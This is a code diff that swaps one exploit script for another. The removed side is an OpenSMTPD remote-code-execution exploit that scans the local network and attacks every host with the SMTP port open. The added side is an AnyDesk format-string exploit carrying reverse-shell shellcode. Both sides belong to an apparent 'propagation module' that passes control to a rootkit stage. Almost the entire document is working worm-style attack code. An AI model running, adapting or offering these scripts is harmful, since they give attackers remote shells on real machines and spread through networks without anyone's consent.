@@ -1,101 +1,58 @@
-# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
-# Date: 2020-01-29
-# Exploit Author: 1F98D
-# Original Author: Qualys Security Advisory
-# Vendor Homepage: https://www.opensmtpd.org/
-# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
-# Version: OpenSMTPD < 6.6.2
-# Tested on: Debian 9.11 (x64)
-# CVE: CVE-2020-7247
-# References:
-# https://www.openwall.com/lists/oss-security/2020/01/28/3
-#
-# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
-# escape dangerous characters from user-controlled input. An attacker
-# can exploit this to execute arbitrary shell commands on the target.
-# 
-#!/usr/local/bin/python3
+# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
+# Date: 09/06/20
+# Exploit Author: scryh
+# Vendor Homepage: https://anydesk.com/en
+# Version: 5.5.2
+# Tested on: Linux
+# Walkthrough: https://devel0pment.de/?p=1881
 
-from socket import *
-import nmap
-import sys
+#!/usr/bin/env python
 import struct
+import socket
+import sys
 
-def exploit(ADDR, PORT, CMD):
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect((ADDR, PORT))
+ip = '192.168.x.x'
+port = 50001
 
-    res = s.recv(1024)
-    if 'OpenSMTPD' not in str(res):
-        print('[!] No OpenSMTPD detected')
-        print('[!] Received {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
+def gen_discover_packet(ad_id, os, hn, user, inf, func):
+  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
+  d += struct.pack('>I', ad_id)
+  d += struct.pack('>I', 0)
+  d += chr(0x2)+chr(os)
+  d += struct.pack('>I', len(hn)) + hn
+  d += struct.pack('>I', len(user)) + user
+  d += struct.pack('>I', 0)
+  d += struct.pack('>I', len(inf)) + inf
+  d += chr(0)
+  d += struct.pack('>I', len(func)) + func
+  d += chr(0x2)+chr(0xc3)+chr(0x51)
+  return d
 
-    print('[*] OpenSMTPD detected')
-    s.send(b'HELO x\r\n')
-    res = s.recv(1024)
-    if '250' not in str(res):
-        print('[!] Error connecting, expected 250')
-        print('[!] Received: {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+shellcode =  b""
+shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
+shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
+shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
+shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
+shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
+shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
+shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
+shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
+shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
+shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"
 
-    print('[*] Connected, sending payload')
-    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
-    res = s.recv(1024)
-    if '250' not in str(res):
-        print('[!] Error sending payload, expected 250')
-        print('[!] Received: {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
-
-    print('[*] Payload sent')
-    s.send(b'RCPT TO:<root>\r\n')
-    s.recv(1024)
-    s.send(b'DATA\r\n')
-    s.recv(1024)
-    s.send(b'\r\nxxx\r\n.\r\n')
-    s.recv(1024)
-    s.send(b'QUIT\r\n')
-    s.recv(1024)
-    print('[*] Done')
-    
-def get_network_range():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    packed_ip = socket.inet_aton(ip_address)
-    ip_as_integer = struct.unpack("!I", packed_ip)[0]
-    network_mask = 0b11111111111111111111111100000000
-    network_address = ip_as_integer & network_mask
-    packed_network_address = struct.pack("!I", network_address)
-    dotted_network_address = socket.inet_ntoa(packed_network_address)
-    network_range = dotted_network_address + '/24'
-    return network_range
-
-def scan_network_for_port(port):
-    nm = nmap.PortScanner()
-    network_range = get_network_range()
-    nm.scan(hosts=network_range, arguments=f'-p {port}')
-
-    hosts_list = []
-    for host in nm.all_hosts():
-        if nm[host].has_tcp(port) and nm[host]['tcp'][port]['state'] == 'open':
-            hosts_list.append(host)
-
-    return hosts_list
+print('sending payload ...')
+p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(p, (ip, port))
+s.close()
+print('reverse shell should connect within 5 seconds')
             
-def run():
-    next_action = ""
-    data = ""
-    print("[+] Propagation module activated...")
-
-    cmd = "nano touch miau.txt"  # Replace with your command
-    port = 587
-    found_hosts = scan_network_for_port(port)
-
-    for host in found_hosts:
-        exploit(host, port, cmd)
-
-    next_action = "rootkit"
-    return data, next_action
+#def run():
+#    next_action = ""
+#    data = ""
+#    print("[+] Propagation module activated...")
+#
+#    next_action = "rootkit"
+#    return data, next_action
